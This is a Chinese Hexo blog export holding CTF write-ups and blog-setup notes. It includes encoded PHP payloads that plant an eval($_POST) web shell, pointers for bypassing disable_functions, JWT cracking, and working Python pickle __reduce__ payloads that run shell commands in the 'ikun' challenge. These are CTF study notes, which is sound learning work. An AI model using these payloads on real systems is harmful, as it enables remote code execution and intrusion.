class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目的构造：(assert)(eval($_POST[&#x27;van&#x27;]));</span><br><span class="line"></span><br><span class="line">为什么不构造成assert($_POST[&#x27;van&#x27;]);，因为这样构造出来的是(&quot;assert&quot;)(&quot;$_POST[&#x27;van&#x27;]&quot;)</span><br><span class="line">第二个括号还是字符串，而不会被执行</span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6 : eval($_POST[shell])</span><br><span class="line">这样则执行顺序 先eval 后assert后eval，成功执行。</span><br></pre></td></tr></table></figure><h5 id="一些可以的"><a href="#一些可以的" class="headerlink" title="一些可以的"></a>一些可以的</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">// $&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"></span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  //别忘了后面的分号</span><br><span class="line">或者：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure><h5 id="连上shell"><a href="#连上shell" class="headerlink" title="连上shell"></a>连上shell</h5><p>看到flag readflag </p><p>readflag打开看完应该是一个可执行的文件，执行完应该就有flag。</p><p>但是由于disable_function，所以要进行绕过</p><h6 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h6><p>利用蚁剑插件绕过disable_function，得翻墙下载，或者网上找资源，其次是在Linux下使用的。所以在kali安装后直接使用，使用后进入蚁剑终端执行&#x2F;readflag即可</p><h6 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h6><p>看不大懂。不过理解就是编写恶意文件恶意函数，使系统在执行一个进程时候将优先级更高的恶意文件恶意函数先进行调用。</p><p>var&#x2F;tmp有上传权限，可以上传恶意</p><p>难难，，挖坑待补。。</p><p>原理：</p><p><a href="https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>参考：</p><p><a href="https://blog.csdn.net/qq_45699846/article/details/123388028">https://blog.csdn.net/qq_45699846/article/details/123388028</a></p><p><a href="https://blog.csdn.net/m0_62879498/article/details/124803318">https://blog.csdn.net/m0_62879498/article/details/124803318</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">https://blog.csdn.net/qq_45521281/article/details/105656737</a></p><p><a href="https://guokeya.github.io/post/hwKOeu6uW/">https://guokeya.github.io/post/hwKOeu6uW/</a></p><p><a href="https://www.cnblogs.com/yesec/p/12483631.html">https://www.cnblogs.com/yesec/p/12483631.html</a></p><p><a href="https://www.anquanke.com/post/id/175403#h2-0">https://www.anquanke.com/post/id/175403#h2-0</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10612798.html">https://www.cnblogs.com/leixiao-/p/10612798.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 坑 </tag>
            
            <tag> rce </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>待学</title>
      <link href="/2023/02/03/%E5%BE%85%E5%AD%A6/"/>
      <url>/2023/02/03/%E5%BE%85%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>pickle反序列化</p><p>代码执行</p><p><a href="https://xz.aliyun.com/t/11934">https://xz.aliyun.com/t/11934</a></p><p><a href="http://www.yuxuanzhe.com/posts/32276634.html">http://www.yuxuanzhe.com/posts/32276634.html</a></p><p><a href="https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/">https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/</a></p><p><a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p><p><a href="https://blog.csdn.net/baichoufei90/article/details/84030479">https://blog.csdn.net/baichoufei90/article/details/84030479</a></p><p>找到的一些博客</p><p><a href="https://ucasers.cn/buuctf-web%E9%A2%98%E8%A7%A3%E6%B3%95%E6%B1%87%E6%80%BB/">https://ucasers.cn/buuctf-web%E9%A2%98%E8%A7%A3%E6%B3%95%E6%B1%87%E6%80%BB/</a></p><p><a href="http://max666.fun/416.html">HSCSEC CTF 2023 WEB-WP - C T F eeeeer (max666.fun)</a></p><p><a href="https://www.cnblogs.com/vconlln/p/17116081.html#_label3_0_6_0">HSCSEC CTF 2023 (HSC-2th 2023) - vconlln - 博客园 (cnblogs.com)</a></p><p><a href="https://www.ctfiot.com/writeup">WriteUp | CTF导航 (ctfiot.com)</a></p><p>[(124条消息) <a href="https://blog.csdn.net/SopRomeo/article/details/105123395">BJDCTF 2nd] WEB 简单题汇总_penson by 小乌的博客-CSDN博客_buuctf 2nd wp</a></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><a href="https://lonmar.cn/2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/#0x03-addslashes">https://lonmar.cn/2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/#0x03-addslashes</a></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p><p>sqlilabs再复习 、sql注入join</p><p>反序列化 重写类中新的函数吗</p><p>escapeshellarg</p><p>反序列化</p><p>git出错了</p><p>thinkphp这些</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day1 Web2]ikun </title>
      <link href="/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/"/>
      <url>/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/</url>
      
        <content type="html"><![CDATA[<h4 id="初步发现"><a href="#初步发现" class="headerlink" title="初步发现"></a>初步发现</h4><p>打开发现是商场购物页面</p><p>提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面</p><p>点商品，注意有两个，一个是商品详情页，一个是直接点购买</p><p>抓包发现</p><p>有price还有折扣，发现改price怎么改都不行，那么就试试只改折扣。</p><p>暴露了后台地址，访问发现只能admin</p><p>又注意到抓包有jwt。</p><p>解密 <a href="https://jwt.io/">https://jwt.io/</a></p><p>要改则必须破解密码 利用 c-jwt-cracker</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack   加密后的结果</span><br></pre></td></tr></table></figure><p>密钥1Kun</p><p>改完重新发包，点击一键成为大会员没什么用</p><h4 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h4><p>看源代码，发现泄露，下载完审计</p><p>发现有hint</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br><span class="line">Unicode解码得</span><br><span class="line">这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里</span><br></pre></td></tr></table></figure><p>找后门</p><p>在Admin.py找到</p><h4 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h4><p>pickle：Python对象的持久化存储</p><p>功能：将任意Python对象存储及恢复</p><p>关键函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump()   文件</span><br><span class="line">pickle.load()</span><br><span class="line">pickle.dumps()字符串</span><br><span class="line">pickle.loads()</span><br><span class="line">dump()：将 Python 中的对象序列化成二进制对象，并写入文件；</span><br><span class="line">load()：读取指定的序列化数据文件，并返回对象。</span><br><span class="line">dumps()：将 Python 中的对象序列化成二进制对象，并返回；</span><br><span class="line">loads()：读取给定的二进制对象数据，并将其转换为 Python 对象；</span><br></pre></td></tr></table></figure><p>具体用法</p><p>​<a href="http://c.biancheng.net/view/5736.html">Python pickle模块：实现Python对象的持久化存储 (biancheng.net)</a></p><p>反序列化详解</p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p>只要在序列化中的字符串中存在<code>R</code>指令，<code>__reduce__</code>方法就会被执行，无论正常程序中是否写明了<code>__reduce__</code>方法</p><p>记得生成payload时使用的python版本尽量与目标上的版本一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br><span class="line"></span><br><span class="line">urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式</span><br><span class="line">pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</span><br><span class="line"></span><br><span class="line">在 Python2.x 中的用法是：</span><br><span class="line">urllib.quote(text)</span><br><span class="line">Python3.x 中是</span><br><span class="line">urllib.parse.quote(text)</span><br><span class="line">URL 中传参数的部分（query String），格式是：</span><br><span class="line">name1=value1&amp;name2=value2&amp;name3=value3</span><br><span class="line">假如你的 name 或者 value 值中有『&amp;』或者『=』等符号，就当然会有问题。所以URL中的参数字符串也需要把『&amp;=』等符号进行编码。</span><br><span class="line">URL编码的方式是把需要编码的字符转化为 %xx 的形式。</span><br></pre></td></tr></table></figure><p>继续做题</p><p>点击一键成为大会员，抓包发现become参数，利用reduce方法构造poc，修改become值，执行命令</p><p>Python2和Python3的执行结果不同，下面Python2的成功了（不明原因）</p><p>读取目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))<span class="comment"># reduce第二个参数得是元组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#print a</span></span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="comment"># cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.  </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># cnt%0Alistdir%0Ap0%0A%28V/%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><p>最后执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="comment"># return (os.listdir, (&#x27;/&#x27;,))</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># c__builtin__%0Aeval%0Ap0%0A%28V__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">一些可执行的</span><br><span class="line"><span class="comment"># 未导入os模块，通用</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;calc.exe&#x27;</span>,))</span><br><span class="line"><span class="comment"># return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"><span class="comment"># return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 导入os模块</span></span><br><span class="line"> <span class="comment"># return (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return eval, (&quot;os.system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"> <span class="comment"># return map, (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return map, (os.system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> <span class="comment"># return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span></span><br></pre></td></tr></table></figure><h4 id="深入学习："><a href="#深入学习：" class="headerlink" title="深入学习："></a>深入学习：</h4><p><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结 - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/sijidou/p/16305695.html">CTF-python pickle反序列化 - sijidou - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.secpulse.com/archives/127664.html">python反序列化攻击 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> pickle反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+GitHub+butterfly</title>
      <link href="/2023/02/03/hexo-GitHub-butterfly/"/>
      <url>/2023/02/03/hexo-GitHub-butterfly/</url>
      
        <content type="html"><![CDATA[<h4 id="hexo操作"><a href="#hexo操作" class="headerlink" title="hexo操作"></a>hexo操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在blog文件夹下打开git bash（存放hexo源码那个文件夹）</span><br><span class="line">hexo clean 清除</span><br><span class="line">hexo g  生成</span><br><span class="line">hexo s  本地模拟</span><br><span class="line">hexo d  上传到远端</span><br><span class="line">重新上传得要  先清除、生成再上传</span><br><span class="line"></span><br><span class="line">hexo n &quot;title&quot;  新建文章  最好后面是双引号包裹的</span><br></pre></td></tr></table></figure><h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p>图床，就是专门用来存放图片的服务器，更多的是指提供图片外链的服务，有免费图床，也有付费图床。</p><h3 id="hexo坑"><a href="#hexo坑" class="headerlink" title="hexo坑"></a>hexo坑</h3><h4 id="文章标题"><a href="#文章标题" class="headerlink" title="文章标题"></a>文章标题</h4><p>如果是标题为[CISCN2019 华北赛区 Day1 Web2]ikun则会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR Process failed: _posts/111.md</span><br><span class="line">YAMLException: bad indentation of a mapping entry (1:34)</span><br><span class="line"></span><br><span class="line"> 1 | title: [CISCN2019 华北赛区 Day1 Web2]ikun</span><br><span class="line">--------------------------------------^</span><br><span class="line"> 2 | date: 2023-02-03 23:46:44</span><br><span class="line"> 3 | tags:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果改成其他的则不会，不过有些不符合规则还是会</p><p>解决：加双引号，不过命令行加双引号解决不了，得先破坏掉[]后，再在md文件   title: “[CISCN2019 华北赛区 Day1 Web2]ikun “</p><h4 id="报错、缩进问题"><a href="#报错、缩进问题" class="headerlink" title="报错、缩进问题"></a>报错、缩进问题</h4><p><a href="https://www.yamllint.com/">https://www.yamllint.com/</a>    可以在这个网站里面检查</p><h4 id="命令报错"><a href="#命令报错" class="headerlink" title="命令报错"></a>命令报错</h4><p>Npm 报错 可能得管理员打开powershell</p><h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><h4 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h4><p><a href="https://hexo.io/zh-cn/docs/writing">写作 | Hexo</a></p><p><a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><h4 id="一些教程"><a href="#一些教程" class="headerlink" title="一些教程"></a>一些教程</h4><p><a href="https://www.bilibili.com/read/cv12633102">2021最全hexo搭建博客+matery美化+使用（保姆级教程） - 哔哩哔哩 (bilibili.com)</a></p><h4 id="便捷化"><a href="#便捷化" class="headerlink" title="便捷化"></a>便捷化</h4><p>hexo-admin  <a href="https://jaredforsyth.com/hexo-admin/admin/#/">Hexo Admin (jaredforsyth.com)</a></p><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>目录 </p><p>代码块</p><h5 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h5><p>博客显示不出来全部：本地的会有些问题，到服务端就不怎么会了</p><p>在博文类，代码块前面会有123456789101112131415161718192021222324252627282930313233343536373839404142 这些数字？？？？？</p><p>各种页面</p><p>在各种页面的index.md中，type加上各自的属性</p><p>如type: “categories”</p><h5 id="多个标签"><a href="#多个标签" class="headerlink" title="多个标签"></a>多个标签</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tags: </span><br><span class="line">  - php</span><br><span class="line">  - rce</span><br><span class="line">  - 坑</span><br><span class="line">  注意-后有空格</span><br><span class="line">tags: [php, rce]效果一样</span><br></pre></td></tr></table></figure><p>多个分类：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 这是默认的写法，给文章添加一个分类。</span><br><span class="line">categories: 123</span><br><span class="line"># 这会将文章分类123/456子分类目录下。</span><br><span class="line">categories: [123, 456]</span><br><span class="line">这会将文章分类到123/456子分类目录下。</span><br><span class="line">categories:</span><br><span class="line">   - 123</span><br><span class="line">   - 456</span><br><span class="line">多标签写法，文章被分类到123、456以及123的自分类789这3个分类下面，官方指定写法。</span><br><span class="line">categories:</span><br><span class="line">   - [123]</span><br><span class="line">   - [456]</span><br><span class="line">   - [123, 789]</span><br></pre></td></tr></table></figure><p>分类导航栏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">buttfly的 config里面</span><br><span class="line">找menu</span><br><span class="line">分类|| fas fa-folder-open: </span><br><span class="line">    Ctf: /categories/ctf/ || fas fa-web</span><br><span class="line">    Hexo: /categories/hexo || fas fa-keyboard-o</span><br><span class="line">fas 这些是图标的，可以去网上找找。</span><br><span class="line"></span><br><span class="line">hexo的config里面</span><br><span class="line">category_map:</span><br><span class="line">http://ijiaober.github.io/2014/08/05/hexo/hexo-04/</span><br></pre></td></tr></table></figure><h4 id="一些教学"><a href="#一些教学" class="headerlink" title="一些教学"></a>一些教学</h4><p><a href="https://guguge.top/blog/butterfly/">Hexo-butterfly主题设置文档 | 咕咕鸽 (guguge.top)</a></p><p><a href="https://zhu-dongya.gitee.io/posts/hexo-butterfly-02/">Hexo+Butterfly系列：主题魔改（二） | ZhuDongya’s Blog (gitee.io)</a></p><p><a href="https://www.cnblogs.com/ldu-xingjiahui/p/12594024.html">短短1天我学会了如何修改Butterfly的配置文件 - XJHui - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html">Butterfly美化 - MoYu-zc - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 个人博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/02/02/hello-world/"/>
      <url>/2023/02/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
